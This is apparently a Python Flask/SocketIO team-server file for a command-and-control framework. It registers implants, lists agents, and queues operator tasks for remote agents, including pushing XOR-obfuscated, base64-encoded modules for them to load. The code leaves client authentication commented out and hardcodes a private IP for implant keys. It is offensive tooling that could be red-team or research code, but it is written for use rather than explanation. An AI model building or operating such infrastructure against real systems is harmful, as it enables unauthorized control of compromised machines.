import json
import os

from connect.models import db, AgentModel, TaskModel, ImplantModel
from connect.generate import digit_identifier
from connect.convert import string_to_base64, xor_base64
from flask_socketio import emit, disconnect, SocketIO
from flask import Blueprint, render_template

key = digit_identifier()
team_server = Blueprint('team_server', __name__)
websocket = SocketIO(max_http_buffer_size=1e10)


@team_server.route('/')
def home():
    return render_template('index.html')

def _commit(models: list):
    """
    Commits model object changes to the database.

    :param models: A list of models.
    """
    for model in models:
        db.session.add(model)
    db.session.commit()


def connect(auth):
    """
    This event is triggered on client connection requests.
    If the authentication data does not match the generated key,
    then a disconnect event is triggered.

    :param auth:
    """
    print('lol')
    #if not auth == key:
    #    disconnect()


def agents(data):
    """
    This event emits all current agents within the database to the client.
    """
    if not data:
        agents = [agent.get_agent() for agent in AgentModel.query.all()]
        emit('agents', agents, broadcast=False)


def implants(data):
    """
    This event emits all current agents within the database to the client.
    """
    if not data:
        implants = [implant.get_implant() for implant in ImplantModel.query.all()]
        emit('implants', implants, broadcast=False)
    data = json.loads(data)
    implant_name = data['implant_name'] if 'implant_name' in data.keys() else None
    if not implant_name:
        return
    implant = ImplantModel(name=implant_name, language=data['language'])
    implant_exists = db.session.query(ImplantModel.name).filter_by(name=implant_name).first() is not None
    if implant_exists:
        return
    _commit([implant])
    emit('implants', {'key':f'http://192.168.1.23:9090/ {implant.key}'})
        

def tasks(data):
    """
    This event schedules a new task to be sent to the agent.
    The *data* excpeted is {'name':'', 'agent_name':'', 'arguments':'', type:''}

    :param data:
    """
    if not data:
        tasks = [task.get_task() for task in TaskModel.query.all()]
        emit('tasks', tasks, broadcast=False)

    data = json.loads(data)
    agent = AgentModel.query.filter_by(name=data['agent_name']).first()
    available_modules = agent.implant.available_modules
    command = data['name']
    if command in available_modules.keys():
        module_name = available_modules[command][1].lower()
        module_resource = available_modules[command][0]
        if module_name not in agent.loaded_modules:
            with open(f'{os.getcwd()}{module_resource}', 'rb') as fd:
                key, file = xor_base64(fd.read())
            task = TaskModel(name='load', description=f'load module {module_name} for {command}', agent=agent, arguments=f'{key},{file},{string_to_base64(command)}', type='1')
    task = TaskModel(name=command, description=data['description'], agent=agent, arguments=data['arguments'], type=data['type'])
    _commit([task])


# Operator Passthrough Events


@websocket.event
def connected(data):
    websocket.emit('connected', data)

    
@websocket.event
def task_sent(data):
    websocket.emit('task_sent', data)

    
@websocket.event
def task_results(data):
    websocket.emit('task_results', data)


@websocket.event
def task_error(data):
    websocket.emit('task_error', data)